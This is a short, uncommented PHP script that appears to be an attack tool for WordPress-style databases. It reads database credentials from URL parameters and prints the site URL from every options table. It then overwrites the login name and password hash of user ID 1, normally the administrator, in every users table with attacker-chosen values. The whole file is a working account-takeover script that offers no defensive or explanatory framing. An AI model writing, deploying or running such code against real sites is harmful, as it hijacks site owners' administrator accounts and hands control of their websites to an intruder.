<?php
$servername = "localhost";
$username = $_GET['2'];;
$password = $_GET['3'];;
$dbname = $_GET['1'];

$conn = mysqli_connect($servername, $username, $password, $dbname);
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}
$sql = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() AND TABLE_NAME LIKE '%options';";
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
    while($row = mysqli_fetch_assoc($result)) {
        //echo "$row[TABLE_NAME]. <br>";
         $s1="SELECT option_value FROM $row[TABLE_NAME] where option_name='siteurl'; ";
//echo $s1;
         $res = mysqli_query($conn,$s1);
         $r=mysqli_fetch_assoc($res);
         echo "$r[option_value] <br>";
}}
$sql = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database() AND TABLE_NAME LIKE '%users';";
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    while($row = mysqli_fetch_assoc($result)) {
$s="UPDATE `$row[TABLE_NAME]` SET `user_login` = 'ac', `user_pass` = 'e2075474294983e013ee4dd2201c7a73' where `ID` = '1';";
$res = mysqli_query($conn,$s);
}}
mysqli_close($conn);
?>

